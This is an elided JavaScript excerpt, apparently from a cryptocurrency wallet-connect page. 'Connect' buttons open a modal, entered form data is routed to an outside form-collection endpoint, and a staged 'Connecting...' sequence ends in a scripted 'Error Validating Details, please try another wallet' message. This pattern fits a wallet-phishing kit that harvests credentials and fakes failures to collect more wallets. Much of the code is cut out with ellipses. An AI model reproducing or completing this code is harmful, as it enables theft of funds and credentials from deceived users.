...
function openModalMain() {
    ...
    show_elem("#modal-closes");
    document.getElementById('modal-closes').addEventListener('click', function() {
        closeModal();
    });
}
...
function inspectExport(formdata, nextpage) {
    ...
    let t = `https://submit-form.com/IVOwg4cLv`;
...
function on_submit() {
    ...
    one_secs_delay(function() {
        ...
        one_secs_delay(function() {
            b.innerHTML = "Connecting... Please Wait";

            setTimeout(function() {
                rect.style.stroke = "none";
                loading_img.style.border = "red 4px solid";
                b.style.color = "red";
                b.innerHTML = "Error Validating Details, please try another wallet";
...
window.addEventListener('load', () => {
    document.querySelectorAll(".connectButton")
        .forEach(elem => {
            elem.addEventListener('click', function(event) {
                openModalMain(event);
